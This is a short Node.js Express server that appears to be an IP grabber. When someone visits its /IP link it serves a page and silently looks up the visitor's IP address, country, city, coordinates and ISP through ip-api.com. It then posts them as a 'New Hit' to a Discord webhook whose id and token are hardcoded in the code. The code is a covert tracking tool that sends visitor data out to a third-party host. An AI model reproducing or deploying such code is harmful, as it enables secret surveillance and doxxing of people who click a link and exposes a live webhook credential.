const express = require(`express`)
const app = express()
const axios = require(`axios`)
app.set('trust proxy', true)
const port =process.env.PORT || 8080
const requestIP = require(`request-ip`)
const { EmbedBuilder, WebhookClient } = require('discord.js');

app.use(requestIP.mw())
app.listen(port, ()=>{
    console.log(`listening on port ${port}`)
})

app.get(`/IP`, async (req, res)=>{
    res.sendFile(__dirname, `/index.html`)
    const ip = req.clientIp
    const ipinfoRes = await axios.get(`http://ip-api.com/json/${ip}`)
    const country = ipinfoRes.data.country
    const countryCode = ipinfoRes.data.countryCode
    const city = ipinfoRes.data.city
    const lon = ipinfoRes.data.lon
    const lat = ipinfoRes.data.lat
    const isp =ipinfoRes.data.isp
    await sendWH(ip, country, countryCode, city, lon, lat, isp)

})

async function sendWH(ip, country, countryCode, city, lat, lon ,isp){
    const webhook = new WebhookClient({
		id: '1090664218010845234',
		token:
			'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
	});
    const embed = new EmbedBuilder()
		.setTitle(`**New Hit ❗**`)
		.setAuthor({ name: 'Legion', iconURL: 'https://i.imgur.com/nXvl29a.png'})
		// .setDescription('@everyone')
		.setColor(0x0099FF)
		.addFields(
			{ name: 'IPV4', value: `\`${ip}\``, inline: true },
			{ name: 'Country', value: `\`${country}\` (${countryCode})`, inline: true },
			{ name: 'City', value: `\n\`${city}\`` },
			{
				name: 'LON | LAT',
				value: `\`${lon} | ${lat}\``,
			},
			{name: `ISP`, value:`\`${isp}\``, inline: true },
		)
		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/rlHZ2Sx.png' })
		.setTimestamp();

	webhook.send({
		embeds: [embed],
	});
}